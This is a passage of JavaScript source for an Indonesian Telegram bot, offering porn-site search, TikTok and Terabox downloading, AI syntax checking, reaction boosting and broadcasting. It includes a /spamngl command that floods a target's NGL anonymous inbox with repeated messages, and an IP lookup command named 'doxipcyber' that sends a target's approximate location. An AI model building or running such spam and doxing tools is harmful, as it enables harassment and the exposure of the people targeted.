  const chatId = msg.chat.id;

  try {
    const text = (match[1] || "").trim();

    if (!text) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/tta <teks>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "🎤 *Generating voice...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const audio = await generateTTS(text);

    await bot.sendVoice(
      chatId,
      audio,
      {
        caption: "🎧 *Done!*",
        parse_mode: "Markdown"
      }
    );

  } catch (e) {
    console.error("[TTA ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/xvideosearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/xvideosearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching videos for:* ${query}...`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.nekolabs.web.id/discovery/xvideos/search?q=${encodeURIComponent(query)}`
    );

    if (!data?.success || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found for:* ${query}`,
        { parse_mode: "Markdown" }
      );
    }

    const first = data.result[0];

    // Kirim thumbnail pertama
    await bot.sendPhoto(chatId, first.cover, {
      caption:
`🔍 *Search Results for:*
_${query}_

Check more results below 👇`,
      parse_mode: "Markdown"
    });

    // Kirim daftar hasil
    for (let i = 0; i < data.result.length; i++) {
      const v = data.result[i];

      const textMsg =
`🎬 *${i + 1}. ${v.title}*

⏱ *Duration:* ${v.duration}
📺 *Resolution:* ${v.resolution}
👤 *Author:* ${v.artist}

🔗 [Open Video](${v.url})`;

      await bot.sendMessage(chatId, textMsg, {
        parse_mode: "Markdown",
        disable_web_page_preview: false
      });
    }

  } catch (e) {
    console.error("[XVIDEOSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ *Error while searching*\nTry again later.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/xnxxsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/xnxxsearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching XNXX results...*\n🔎 Query: *${query}*`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.nekolabs.web.id/discovery/xnxx/search?q=${encodeURIComponent(query)}`
    );

    if (!data?.success || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found*\n🔎 Query: *${query}*`,
        { parse_mode: "Markdown" }
      );
    }

    const first = data.result[0];

    // Kirim cover awal
    await bot.sendPhoto(chatId, first.cover, {
      caption:
`🔎 *XNXX Search Result*
Query: _${query}_

Results below ⤵️`,
      parse_mode: "Markdown"
    });

    // Kirim tiap hasil
    for (let i = 0; i < data.result.length; i++) {
      const v = data.result[i];

      const textMsg =
`🔞 *${i + 1}. ${v.title}*

👁 *Views:* ${v.views}
⏱ *Duration:* ${v.duration}
📺 *Resolution:* ${v.resolution}

🔗 [Open Video](${v.url})`;

      await bot.sendMessage(chatId, textMsg, {
        parse_mode: "Markdown",
        disable_web_page_preview: false
      });
    }

  } catch (e) {
    console.error("[XNXXSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ *Error while searching*\nPlease try again later.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/ttsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const queryRaw = (match[1] || "").trim();

    if (!queryRaw) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/ttsearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    const args = queryRaw.split(" ");
    const lastArg = args[args.length - 1];

    let page = 0;
    let keyword = queryRaw;

    if (!isNaN(lastArg)) {
      page = parseInt(lastArg, 10) - 1;
      keyword = args.slice(0, -1).join(" ");
    }

    const loading = await bot.sendMessage(
      chatId,
      "🔍 *Searching TikTok...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      `https://api.nekolabs.web.id/discovery/tiktok/search?q=${encodeURIComponent(keyword)}`
    );

    const results = res.data?.result;
    if (!results?.length) {
      return bot.sendMessage(chatId, "❌ *No result found.*", { parse_mode: "Markdown" });
    }

    page = Math.max(0, Math.min(page, results.length - 1));
    const v = results[page];

    const caption =
`🔍 *TikTok Search Result*

🎬 *${v.title}*

👤 *Author:* ${v.author.name} (@${v.author.username})
📅 *Date:* ${v.create_at}

▶️ *Views:* ${v.stats.play}
❤️ *Likes:* ${v.stats.like}
💬 *Comments:* ${v.stats.comment}
🔁 *Shares:* ${v.stats.share}

🎵 *Music:* ${v.music_info.title}

📄 *Page:* ${page + 1} / ${results.length}`;

    const buttons = [];

    if (page > 0) {
      buttons.push([
        { text: "⬅️ ᴘʀᴇᴠ", callback_data: `ttsearch|${keyword}|${page}` }
      ]);
    }

    if (page < results.length - 1) {
      buttons.push([
        { text: "ɴᴇxᴛ ➡️", callback_data: `ttsearch|${keyword}|${page + 2}` }
      ]);
    }

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

    await bot.sendVideo(chatId, v.videoUrl, {
      caption,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });

  } catch (e) {
    console.error("[TTSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *TTSearch Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.on("callback_query", async (q) => {
  try {
    if (!q.data.startsWith("ttsearch|")) return;

    const [, keyword, pageStr] = q.data.split("|");
    const page = parseInt(pageStr, 10) - 1;

    const chatId = q.message.chat.id;
    const messageId = q.message.message_id;

    const res = await axios.get(
      `https://api.nekolabs.web.id/discovery/tiktok/search?q=${encodeURIComponent(keyword)}`
    );

    const results = res.data?.result;
    if (!results?.length) return;

    const maxPage = results.length - 1;
    const currentPage = Math.max(0, Math.min(page, maxPage));
    const v = results[currentPage];

    const caption =
`🔍 *TikTok Search Result*

🎬 *${v.title}*

👤 *Author:* ${v.author.name} (@${v.author.username})
📅 *Date:* ${v.create_at}

▶️ *Views:* ${v.stats.play}
❤️ *Likes:* ${v.stats.like}
💬 *Comments:* ${v.stats.comment}
🔁 *Shares:* ${v.stats.share}

🎵 *Music:* ${v.music_info.title}

📄 *Page:* ${currentPage + 1} / ${results.length}`;

    const buttons = [];

    if (currentPage > 0) {
      buttons.push([
        { text: "⬅️ ᴘʀᴇᴠ", callback_data: `ttsearch|${keyword}|${currentPage}` }
      ]);
    }

    if (currentPage < maxPage) {
      buttons.push([
        { text: "ɴᴇxᴛ ➡️", callback_data: `ttsearch|${keyword}|${currentPage + 2}` }
      ]);
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: v.videoUrl,
        caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: buttons }
      }
    );

    await bot.answerCallbackQuery(q.id);

  } catch (e) {
    console.error("[TTSEARCH CALLBACK ERROR]", e.message);
  }
});

bot.onText(/^\/checksyntax(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  let codeContent = "";

  try {
    const argText = (match[1] || "").trim();

    // ❌ Tidak ada kode & tidak reply apa pun
    if (!reply && !argText) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/checksyntax <kode>`\nAtau *reply* file `.js` / teks kode",
        { parse_mode: "Markdown" }
      );
    }

    // =========================
    // AMBIL KODE
    // =========================
    if (reply?.document) {
      const file = reply.document;

      if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(
          chatId,
          "❌ *Hanya mendukung file .js*",
          { parse_mode: "Markdown" }
        );
      }

      // Ambil link file dari Telegram
      const fileLink = await bot.getFileLink(file.file_id);
      const res = await axios.get(fileLink);

      codeContent = res.data;

    } else if (reply?.text) {
      codeContent = reply.text;
    } else {
      codeContent = argText;
    }

    // =========================
    // ANALISIS
    // =========================
    await bot.sendMessage(
      chatId,
      "🔍 *Checking Syntax...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      "https://api.zenzxz.my.id/ai/gpt",
      {
        params: {
          question: codeContent,
          prompt:
            "Analisis kode JS ini, output singkat: line error + solusi singkat. Jangan ubah kode."
        }
      }
    );

    if (!data?.success) {
      return bot.sendMessage(
        chatId,
        "❌ *AI Error*\nSedang gangguan, coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
    }

    bot.sendMessage(
      chatId,
`📌 *Hasil Analisis:*
${data.results}`,
      { parse_mode: "Markdown" }
    );

  } catch (e) {
    console.error("[CHECKSYNTAX ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *CheckSyntax Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/terabox(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    // Ambil query setelah command
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/terabox <terabox link>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "📦 *Fetching Terabox data...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/downloader/terabox?url=${encodeURIComponent(query)}`
    );

    if (!data?.status || !data?.result) {
      return bot.sendMessage(
        chatId,
        "❌ *Invalid link or file not found.*",
        { parse_mode: "Markdown" }
      );
    }

    const files = data.result.Files || [];

    if (!files.length) {
      return bot.sendMessage(
        chatId,
        "⚠️ *No downloadable files found.*",
        { parse_mode: "Markdown" }
      );
    }

    let message =
`📦 *Terabox Downloader*

*Total Files:* ${files.length}

`;

    files.forEach((f, i) => {
      message +=
`#${i + 1}
📁 *${f.Name}*
💾 ${f.Size}
🔗 [Download](${f.Direct_Download_Link})

`;
    });

    message += `🔗 [Original Link](${query})`;

    bot.sendMessage(chatId, message.trim(), {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error("[TERABOX ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *Terabox Downloader Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

const REQUIRED_GROUP_ID = -1003544358401; // ID group wajib
const REQUIRED_GROUP_LINK = "https://t.me/aboutfaiq";

bot.onText(/^\/reactch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try {
    // 🔒 Cek apakah user join group
    const member = await bot.getChatMember(REQUIRED_GROUP_ID, userId);

    if (
      !member ||
      ["left", "kicked"].includes(member.status)
    ) {
      return bot.sendMessage(
        chatId,
`🔒 *Akses Ditolak*

Untuk menggunakan fitur *reactch*,
silakan join group terlebih dahulu 👇`,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🚀 Join Group", url: REQUIRED_GROUP_LINK }]
            ]
          }
        }
      );
    }

    // ===============================
    // LOGIC UTAMA reactch
    // ===============================

    const input = match[1] || "";
    const args = input.split(" ").filter(Boolean);

    if (args.length < 2) {
      return bot.sendMessage(
        chatId,
`📌 *Usage:*
/reactch <channel link> <emoji1 emoji2 ...>

*Example:*
/reactch https://whatsapp.com/channel/xxx ❤️ 😂 🔥`,
        { parse_mode: "Markdown" }
      );
    }

    const link = args.shift();

    const emojiList = args
      .join(" ")
      .replace(/,/g, " ")
      .split(/\s+/)
      .filter(Boolean);

    const emoji = emojiList.join(",");

    await bot.sendMessage(
      chatId,
      "⚙️ *Processing Emoji Reactions...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://react.whyux-xec.my.id/api/rch?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emoji)}`,
      {
        headers: {
          "x-api-key": "API_KEY_KAMU",
          "Accept": "application/json",
        },
      }
    );

    bot.sendMessage(
      chatId,
`✅ *Reaction Sent Successfully!*

*Channel:* ${link}
*Emoji Sent:* ${emojiList.join(" ")}`,
      { parse_mode: "Markdown" }
    );

  } catch (e) {
    console.error("[ReactCh JOIN CHECK ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Terjadi error saat cek akses. Pastikan bot admin di group.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Ambil full argumen setelah command
  const input = match[1] || "";
  const args = input.split(" ").filter(Boolean);

  const url = args[0];
  const jumlah = args[1];
  const pesan =
    args.slice(2).join(" ") ||
    msg.reply_to_message?.text;

  if (!url || !jumlah || !pesan) {
    return bot.sendMessage(
      chatId,
      "📌 *Usage:*\n`/spamngl <url> <jumlah> <pesan>`\n\n💡 Bisa juga reply pesan untuk isi *pesan*",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(
    chatId,
    "⏳ *Sending spam NGL, please wait...*",
    { parse_mode: "Markdown" }
  );

  try {
    const { data } = await axios.get(
      `https://api.elrayyxml.web.id/api/tools/spamngl?url=${encodeURIComponent(url)}&jumlah=${jumlah}&pesan=${encodeURIComponent(pesan)}`
    );

    if (!data?.status) {
      return bot.sendMessage(
        chatId,
        "❌ *Gagal melakukan spam NGL.*",
        { parse_mode: "Markdown" }
      );
    }

    const resultMsg =
`📮 *SPAM NGL RESULT*

👤 *Target:* ${url}
🔢 *Jumlah:* ${jumlah}
💬 *Pesan:* ${pesan}

📌 *Status:* ${data.result}`;

    bot.sendMessage(chatId, resultMsg, { parse_mode: "Markdown" });

  } catch (e) {
    console.error("[SPAMNGL ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `⚠️ *Terjadi kesalahan bre.*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/saveweb(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(
      chatId,
      "📌 *Usage:*\n`/saveweb <url>`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(
    chatId,
    "📦 *Generating website backup...*\n⏳ Please wait...",
    { parse_mode: "Markdown" }
  );

  try {
    const { data } = await axios.get(
      `https://www.veloria.my.id/tools/saveweb2zip?url=${encodeURIComponent(query)}&renameAssets=File`
    );

    if (!data?.result?.downloadUrl) {
      return bot.sendMessage(
        chatId,
        "❌ *Failed to generate ZIP file.*",
        { parse_mode: "Markdown" }
      );
    }

    const zipUrl = data.result.downloadUrl;

    const file = await axios.get(zipUrl, {
      responseType: "arraybuffer"
    });

    const caption =
`🌍 *Website Backup Complete*

🔗 *URL:* ${query}
📁 *Files:* ${data.result.copiedFilesAmount} copied

📦 *Sending ZIP file...*`;

    await bot.sendDocument(
      chatId,
      file.data,
      {
        caption,
        parse_mode: "Markdown"
      },
      {
        filename: "website-backup.zip"
      }
    );

  } catch (e) {
    console.error("[SaveWeb] Error:", e.message);
    bot.sendMessage(
      chatId,
      `⚠️ *SaveWeb Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.on("message", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!msg.text) return;

    const text = msg.text.trim();

    // ❌ Abaikan command
    if (msg.entities?.some(e => e.type === "bot_command")) return;

    // 🔗 Deteksi URL
    const urlMatch = text.match(/(https?:\/\/[^\s]+)/i);
    if (!urlMatch) return;

    const url = urlMatch[0];

    // ✅ Domain support
    const supported = [
      "youtube.com", "youtu.be",
      "tiktok.com", "vt.tiktok.com", "vm.tiktok.com",
      "instagram.com",
      "facebook.com", "fb.watch",
      "twitter.com", "x.com",
      "mediafire.com",
      "twitch.tv",
      "soundcloud.com"
    ];

    if (!supported.some(d => url.toLowerCase().includes(d))) return;

    // ⏳ Cooldown
    global.aioCooldown ??= {};
    const now = Date.now();

    if (global.aioCooldown[userId] && now - global.aioCooldown[userId] < 15000) {
      return bot.sendMessage(
        chatId,
        `<blockquote>⏳ <b>Sabar bre...</b>\nLagi proses yang lain.</blockquote>`,
        { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
      );
    }

    global.aioCooldown[userId] = now;

    console.log(`[AUTO AIO] ${url}`);

    const processing = await bot.sendMessage(
      chatId,
      `<blockquote>🔍 <b>Detected link!</b>\n⏳ Processing, please wait...</blockquote>`,
      { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
    );

    // 🌐 Request API
    const { data } = await axios.get(
      `https://api.deline.web.id/downloader/aio?url=${encodeURIComponent(url)}`,
      { timeout: 35000 }
    ).catch(() => ({ data: { status: false } }));

    // 🧹 Hapus pesan proses
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});

    if (!data?.status || !data?.result?.medias?.[0]) {
      return bot.sendMessage(
        chatId,
        `<blockquote>❌ <b>Gagal download link ini bre.</b></blockquote>`,
        { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
      );
    }

    const result = data.result;
    const media = result.medias[0];
    const direct = media.url;
    const lower = direct.toLowerCase();

    const caption = `<blockquote><b>📥 Auto Downloader</b>

<b>🎞 Title:</b> ${result.title || "Unknown"}
<b>👤 Author:</b> ${result.author || "-"}
<b>🌐 Platform:</b> ${result.source}

<a href="${url}">Open Original</a>
</blockquote>`;

    // 🎥 Video
    if (lower.includes(".mp4") || media.type === "video") {
      return bot.sendVideo(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🔊 Audio
    if (
      lower.includes(".mp3") ||
      lower.includes(".m4a") ||
      media.type === "audio"
    ) {
      return bot.sendAudio(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🖼 Image
    if (
      lower.includes(".jpg") ||
      lower.includes(".jpeg") ||
      lower.includes(".png") ||
      media.type === "image"
    ) {
      return bot.sendPhoto(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🔗 Fallback
    return bot.sendMessage(
      chatId,
      `<blockquote><b>🔗 Download Link:</b>\n${direct}</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error("[AUTO AIO ERROR]", err);
    bot.sendMessage(
      msg.chat.id,
      `<blockquote>❌ <b>Error Auto Download</b>\n${err.message}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

const allUsers = new Set();

// Deteksi user baru
bot.on("message", (msg) => {
  allUsers.add(msg.chat.id);
});

// ===== FITUR BROADCAST =====
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  let success = 0;
  let failed = 0;

  for (const user of allUsers) {
    try {
      await bot.sendMessage(user, text);
      success++;
    } catch {
      failed++;
    }
  }

  bot.sendMessage(
    chatId,
    `📢 *Broadcast selesai!*\n\n` +
    `👥 Total user: *${allUsers.size}*\n` +
    `✅ Terkirim: *${success}*\n` +
    `❌ Gagal: *${failed}*`,
    { parse_mode: "Markdown" }
  );
});

// ===== BROADCAST FOTO =====
bot.on("photo", async (msg) => {
  if (!msg.caption || !msg.caption.startsWith("/bcphoto")) return;

  const sender = msg.chat.id;
  const photoId = msg.photo[msg.photo.length - 1].file_id;
  const caption = msg.caption.replace("/bcphoto", "").trim();

  let success = 0;
  let failed = 0;

  for (const user of allUsers) {
    try {
      await bot.sendPhoto(user, photoId, { caption });
      success++;
    } catch {
      failed++;
    }
  }

  bot.sendMessage(
    sender,
    `📸 *Broadcast Foto selesai!*\n\n` +
    `👥 Total user: *${allUsers.size}*\n` +
    `✅ Terkirim: *${success}*\n` +
    `❌ Gagal: *${failed}*`,
    { parse_mode: "Markdown" }
  );
});

// ===== CEK TOTAL USER =====
bot.onText(/\/totaluser/, (msg) => {
  bot.sendMessage(msg.chat.id, `👥 Total user: *${allUsers.size}*`, {
    parse_mode: "Markdown"
  });
});

function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

bot.onText(/^\/nulis(.*)/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const textMsg = msg.text || "";

    // Ambil input setelah command
    const raw = textMsg.split(" ").slice(1).join(" ").trim();

    let input = raw;

    // Jika user reply text → ambil
    if (!input && msg.reply_to_message) {
      input =
        msg.reply_to_message.text ||
        msg.reply_to_message.caption ||
        "";
    }

    // Jika tetap kosong → kirim panduan
    if (!input) {
      return bot.sendMessage(
        chatId,
        `✍️ <b>Format Nulis</b>\n\n` +
          `Gunakan pemisah <b>|</b>.\n\n` +
          `<b>Format:</b>\n` +
          `<code>/nulis text|nama|kelas|hari|waktu|type</code>\n\n` +
          `<b>Contoh:</b>\n` +
          `<code>/nulis Halo bro|Ucup|9A|Senin|13.00|1</code>\n\n` +
          `Atau minimal teks saja:\n` +
          `<code>/nulis Halo bro</code>`,
        { parse_mode: "HTML" }
      );
    }

    const parts = input.split("|").map((v) => v.trim());

    const text = parts[0] || "";
    const nama = parts[1] || "";
    const kelas = parts[2] || "";
    const hari = parts[3] || "";
    const waktu = parts[4] || "";
    const type = parts[5] || "";

    await bot.sendMessage(chatId, "⏳ Sedang menulis...");

    // Generate URL API Nulis
    const url =
      `https://brat.siputzx.my.id/nulis` +
      `?text=${encodeURIComponent(text)}` +
      `&nama=${encodeURIComponent(nama)}` +
      `&kelas=${encodeURIComponent(kelas)}` +
      `&hari=${encodeURIComponent(hari)}` +
      `&waktu=${encodeURIComponent(waktu)}` +
      `&type=${encodeURIComponent(type)}`;

    // Fetch image
    const res = await axios.get(url, {
      responseType: "arraybuffer",
      timeout: 30000,
    });

    const buffer = Buffer.from(res.data);

    // Kirim hasil foto
    await bot.sendPhoto(
      chatId,
      buffer,
      {
        caption:
          `✍️ <b>Hasil Nulis</b>\n` +
          `<code>${escapeHtml(text)}</code>`,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error("NULIS Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses nulis.");
  }
});

const FormData = require("form-data");

// /veo3 prompt (HARUS reply foto)
bot.onText(/^\/FaiqNotDev(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1]?.trim();
  const reply = msg.reply_to_message;

  try {
    // Validasi reply foto
    if (!reply || !reply.photo) {
      return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/FaiqNotDev "prompt"`);
    }

    if (!prompt) {
      return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
    }

    await fs.ensureDir("./temp");

    // Ambil foto resolusi tertinggi
    const photo = reply.photo[reply.photo.length - 1];
    const file = await bot.getFile(photo.file_id);

    const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
    if (!tokenToUse) {
      return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
    }

    const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;

    const tempPath = path.join(
      "./temp",
      `${Date.now()}_${path.basename(file.file_path)}`
    );

    // Download foto
    const writer = fs.createWriteStream(tempPath);
    const response = await axios.get(fileUrl, { responseType: "stream" });
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Upload ke tmpfiles (WAJIB pakai form-data dari npm)
    const formData = new FormData();
    formData.append("file", fs.createReadStream(tempPath));

    const upload = await axios.post(
      "https://tmpfiles.org/api/v1/upload",
      formData,
      { headers: formData.getHeaders() }
    );

    await fs.unlink(tempPath);

    const imageUrl = upload.data.data.url.replace(
      "tmpfiles.org/",
      "tmpfiles.org/dl/"
    );

    const loading = await bot.sendMessage(
      chatId,
      "⏳ Sedang membuat video dari image..."
    );

    // Payload API
    const payload = {
      videoPrompt: prompt,
      videoAspectRatio: "16:9",
      videoDuration: 5,
      videoQuality: "540p",
      videoModel: "v4.5",
      videoImageUrl: imageUrl,
      videoPublic: false,
    };

    // Generate task
    let taskId;
    try {
      const gen = await axios.post(
        "https://veo31ai.io/api/pixverse-token/gen",
        payload,
        { headers: { "Content-Type": "application/json" } }
      );
      taskId = gen.data.taskId;
    } catch (err) {
      console.log("GEN ERROR RAW:", err.response?.data || err);
      return bot.editMessageText(
        `❌ Error dari server:\n<code>${JSON.stringify(
          err.response?.data || err,
          null,
          2
        )}</code>`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );
    }

    if (!taskId) {
      return bot.editMessageText(
        "❌ Gagal membuat task video (taskId kosong)",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    // Tunggu video selesai
    let videoUrl;
    const timeout = Date.now() + 180000;

    while (Date.now() < timeout) {
      const res = await axios.post(
        "https://veo31ai.io/api/pixverse-token/get",
        {
          taskId,
          videoPublic: false,
          videoQuality: "540p",
          videoAspectRatio: "16:9",
          videoPrompt: prompt,
        }
      );

      if (res.data?.videoData?.url) {
        videoUrl = res.data.videoData.url;
        break;
      }

      await new Promise((r) => setTimeout(r, 5000));
    }

    if (!videoUrl) {
      return bot.editMessageText(
        "❌ Video belum tersedia atau gagal dibuat.",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    await bot.editMessageText(
      `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
      { chat_id: chatId, message_id: loading.message_id }
    );
  } catch (err) {
    console.log("GLOBAL ERROR RAW:", err.response?.data || err);

    bot.sendMessage(
      chatId,
      `❌ Error:\n<code>${JSON.stringify(
        err.response?.data || err.message,
        null,
        2
      )}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const command = match[1];
  const ip = match[2]?.trim(); // bisa kosong

  try {
    // kalau ip kosong, ambil IP publik si user
    const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;

    await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
      parse_mode: "Markdown",
    });

    // Ambil data IP dari ipwho.is
    const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);

    if (!res.success) {
      return bot.sendMessage(chatId, `❌ Gagal menemukan informasi untuk IP *${targetIP}*`, {
        parse_mode: "Markdown",
      });
    }

    // Format hasil
    const info = `
*📡 Informasi IP*
• IP: ${res.ip || "N/A"}
• Type: ${res.type || "N/A"}
• Country: ${res.country || "N/A"} ${res.flag?.emoji || ""}
• Region: ${res.region || "N/A"}
• City: ${res.city || "N/A"}
• Latitude: ${res.latitude || "N/A"}
• Longitude: ${res.longitude || "N/A"}
• ISP: ${res.connection?.isp || "N/A"}
• Org: ${res.connection?.org || "N/A"}
• Domain: ${res.connection?.domain || "N/A"}
• Timezone: ${res.timezone?.id || "N/A"}
• Local Time: ${res.timezone?.current_time || "N/A"}
`;

    if (res.latitude && res.longitude) {
      await bot.sendLocation(chatId, res.latitude, res.longitude);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("TrackIP Error:", err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP.`, {
      parse_mode: "Markdown",
    });
  }
});

const videoList = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
